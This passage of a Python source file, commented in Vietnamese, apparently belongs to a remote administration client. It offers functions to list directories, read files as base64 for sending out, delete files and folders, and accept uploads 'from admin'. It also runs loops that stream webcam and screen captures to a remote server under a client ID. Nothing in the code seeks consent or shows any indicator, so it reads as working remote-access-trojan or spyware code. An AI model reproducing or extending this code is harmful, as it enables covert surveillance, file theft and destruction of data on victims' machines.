def list_directory(path="."):
    """Liệt kê thư mục và file trong đường dẫn"""
    try:
        if not os.path.exists(path):
            return {"error": f"Path does not exist: {path}"}, 1
        
        abs_path = os.path.abspath(path)
        items = []
        
        # Lấy danh sách item trong thư mục
        for item in os.listdir(abs_path):
            item_path = os.path.join(abs_path, item)
            try:
                is_dir = os.path.isdir(item_path)
                size = os.path.getsize(item_path) if not is_dir else 0
                items.append({
                    "name": item,
                    "is_directory": is_dir,
                    "size": size,
                    "path": item_path
                })
            except (OSError, PermissionError):
                # Bỏ qua các file/thư mục không có quyền truy cập
                continue
        
        # Sắp xếp: thư mục trước, file sau
        items.sort(key=lambda x: (not x["is_directory"], x["name"].lower()))
        
        return {
            "current_path": abs_path,
            "items": items,
            "parent_path": os.path.dirname(abs_path) if abs_path != os.path.dirname(abs_path) else None
        }, 0
        
    except Exception as e:
        return {"error": f"Error listing directory: {str(e)}"}, 1

# Thêm hàm get_file để xử lý download file
def get_file(file_path):
    """Đọc và trả về nội dung file dưới dạng base64"""
    try:
        if not os.path.exists(file_path):
            return {"error": f"File not found: {file_path}"}, 1
        
        # Kiểm tra kích thước file (giới hạn 10MB)
        file_size = os.path.getsize(file_path)
        if file_size > 50 * 1024 * 1024:
            return {"error": f"File too large: {file_size} bytes (max 50MB)"}, 1
        
        # Đọc file
        with open(file_path, 'rb') as f:
            file_content = f.read()
        
        file_name = os.path.basename(file_path)
        file_data_b64 = base64.b64encode(file_content).decode()
        
        return {
            "file_name": file_name,
            "file_data": file_data_b64,
            "file_size": file_size
        }, 0
        
    except Exception as e:
        return {"error": f"Error reading file: {str(e)}"}, 1





def delete_item(item_path, item_type):
    """Xóa file hoặc thư mục"""
    try:
        print(f"[DELETE] Attempting to delete: {item_path} (Type: {item_type})")
        
        if not os.path.exists(item_path):
            error_msg = f"Error: Path does not exist: {item_path}"
            print(f"[DELETE] {error_msg}")
            return error_msg, 1
        
        if item_type == "File":
            print(f"[DELETE] Removing file: {item_path}")
            os.remove(item_path)
            success_msg = f"File deleted: {item_path}"
            print(f"[DELETE] {success_msg}")
            return success_msg, 0
        elif item_type == "Folder":
            print(f"[DELETE] Removing folder: {item_path}")
            import shutil
            shutil.rmtree(item_path)
            success_msg = f"Folder deleted: {item_path}"
            print(f"[DELETE] {success_msg}")
            return success_msg, 0
        else:
            error_msg = f"Error: Unknown item type: {item_type}"
            print(f"[DELETE] {error_msg}")
            return error_msg, 1
            
    except PermissionError as e:
        error_msg = f"Error: Permission denied - cannot delete {item_path}"
        print(f"[DELETE] {error_msg}: {e}")
        return error_msg, 1
    except Exception as e:
        error_msg = f"Error deleting {item_path}: {str(e)}"
        print(f"[DELETE] {error_msg}")
        return error_msg, 1


def upload_file(file_name, file_data_b64, destination_path):
    """Lưu file được upload từ admin"""
    try:
        # Giải mã dữ liệu
        file_data = base64.b64decode(file_data_b64)
        
        # Tạo đường dẫn đầy đủ - SỬA LỖI Ở ĐÂY
        if not destination_path or destination_path == "":
            destination_path = os.getcwd()  # Dùng thư mục hiện tại nếu không có
        
        full_path = os.path.join(destination_path, file_name)
        
        # Kiểm tra và tạo thư mục nếu cần
        os.makedirs(os.path.dirname(full_path), exist_ok=True)
        
        # Kiểm tra file đã tồn tại
        if os.path.exists(full_path):
            # Đổi tên file nếu đã tồn tại
            base_name, ext = os.path.splitext(file_name)
            counter = 1
            while os.path.exists(full_path):
                new_name = f"{base_name}_{counter}{ext}"
                full_path = os.path.join(destination_path, new_name)
                counter += 1
        
        # Lưu file
        with open(full_path, 'wb') as f:
            f.write(file_data)
        
        return f"File uploaded successfully: {os.path.basename(full_path)}", 0
        
    except Exception as e:
        return f"Error uploading file: {str(e)}", 1


# ----- optimized streaming workers -----
def webcam_loop():
    global stream_webcam
    print("[WEBCAM] Starting optimized webcam stream")
    cap = None
    
    # Thêm biến quản lý reconnect
    consecutive_failures = 0
    max_consecutive_failures = 3
    
    try:
        cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
        if not cap.isOpened():
            print("[WEBCAM] Webcam not available")
            return
        
        # Cấu hình webcam với thử nghiệm fallback
        cap.set(cv2.CAP_PROP_FRAME_WIDTH, 1280)
        cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 720)
        cap.set(cv2.CAP_PROP_FPS, 20)  # Giảm FPS
        
        # Kiểm tra cấu hình thực tế
        actual_width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
        actual_height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
        actual_fps = cap.get(cv2.CAP_PROP_FPS)
        print(f"[WEBCAM] Actual resolution: {actual_width}x{actual_height}, FPS: {actual_fps}")
        
        frame_skip = 10  # Bỏ qua nhiều frame hơn
        frame_count = 0
        
        while stream_webcam and not stop_event.is_set() and connection_active:
            try:
                ret, frame = cap.read()
                if not ret:
                    print("[WEBCAM] Failed to read frame")
                    time.sleep(0.1)
                    continue
                
                frame_count += 1
                if frame_count % (frame_skip + 1) != 0:
                    continue
                
                # Resize nhỏ hơn
                frame = cv2.resize(frame, (1280, 720))
                
                # Nén với chất lượng thấp hơn
                encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 45] # Giảm chất lượng
                _, jpg = cv2.imencode('.jpg', frame, encode_param)
                
                # Kiểm tra kích thước
                if len(jpg) > 100000:  # 30KB max
                    frame = cv2.resize(frame, (640, 360))
                    _, jpg = cv2.imencode('.jpg', frame, encode_param)
                
                b64 = base64.b64encode(jpg.tobytes()).decode()

                packet = {
                    "type": "stream_frame",
                    "client_id": CLIENT_ID,
                    "stream_type": "webcam",
                    "image": b64,
                    "timestamp": time.time(),
                    "size": len(b64)  # Thêm thông tin size
                }
                
                if send_packet(packet):
                    consecutive_failures = 0  # Reset counter
                    print(f"[WEBCAM] Frame sent: {len(b64)} bytes")
                else:
                    consecutive_failures += 1
                    print(f"[WEBCAM] Send failed: {consecutive_failures}/{max_consecutive_failures}")
                    
                    if consecutive_failures >= max_consecutive_failures:
                        print("[WEBCAM] Too many failures, stopping stream")
                        break

                time.sleep(0.1)  # Tăng delay giữa các frame
    
            except Exception as e:
                print(f"[WEBCAM] Error in frame processing: {e}")
                consecutive_failures += 1
                if consecutive_failures >= max_consecutive_failures:
                    break
                time.sleep(0.5)
    
    except Exception as e:
        print(f"[WEBCAM] Error in webcam loop: {e}")
    finally:
        if cap:
            cap.release()
        print("[WEBCAM] Webcam stream stopped")

def screen_loop():
    global stream_screen
    print("[SCREEN] Starting optimized screen stream")
    
    consecutive_failures = 0
    max_consecutive_failures = 3
    
    try:
        sct = mss()
        monitor = sct.monitors[1]
        
        # Giảm độ phân giải
        capture_width = 1280
        capture_height = 720
        
        monitor_width = monitor["width"]
        monitor_height = monitor["height"]
        
        scale_factor = min(capture_width / monitor_width, capture_height / monitor_height)
        capture_width = int(monitor_width * scale_factor)
        capture_height = int(monitor_height * scale_factor)
        
        print(f"[SCREEN] Capture resolution: {capture_width}x{capture_height}")
        
        frame_skip = 10  # Tăng frame skip
        frame_count = 0
        
        while stream_screen and not stop_event.is_set() and connection_active:
            try:
                s = sct.grab(monitor)
                
                frame_count += 1
                if frame_count % (frame_skip + 1) != 0:
                    time.sleep(0.03)
                    continue

                img = Image.frombytes("RGB", s.size, s.rgb)
                img = img.resize((capture_width, capture_height), Image.Resampling.LANCZOS)
                
                frame = np.array(img)
                frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)

                # Thêm cursor (tùy chọn)
                try:
                    import pyautogui
                    mx, my = pyautogui.position()
                    cursor_x = int(mx * scale_factor)
                    cursor_y = int(my * scale_factor)
                    cv2.circle(frame, (cursor_x, cursor_y), 5, (0, 0, 255), -1)
                except:
                    pass

                # Nén mạnh hơn
                encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 20]  # Chất lượng rất thấp
                _, jpg = cv2.imencode('.jpg', frame, encode_param)
                
                # Resize thêm nếu cần
                if len(jpg) > 100000:
                    frame = cv2.resize(frame, (800, 600))
                    _, jpg = cv2.imencode('.jpg', frame, encode_param)

                b64 = base64.b64encode(jpg.tobytes()).decode()

                packet = {
                    "type": "stream_frame",
                    "client_id": CLIENT_ID,
                    "stream_type": "screen", 
                    "image": b64,
                    "timestamp": time.time(),
                    "size": len(b64)
                }

                if send_packet(packet):
                    consecutive_failures = 0
                    print(f"[SCREEN] Frame sent: {len(b64)} bytes")
                else:
                    consecutive_failures += 1
                    print(f"[SCREEN] Send failed: {consecutive_failures}/{max_consecutive_failures}")
                    if consecutive_failures >= max_consecutive_failures:
                        break

                time.sleep(0.1)  # Tăng delay
            
            except Exception as e:
                print(f"[SCREEN] Error in frame processing: {e}")
                consecutive_failures += 1
                if consecutive_failures >= max_consecutive_failures:
                    break
                time.sleep(0.5)
    
    except Exception as e:
        print(f"[SCREEN] Error in screen loop: {e}")
    finally:
        print("[SCREEN] Screen stream stopped") 

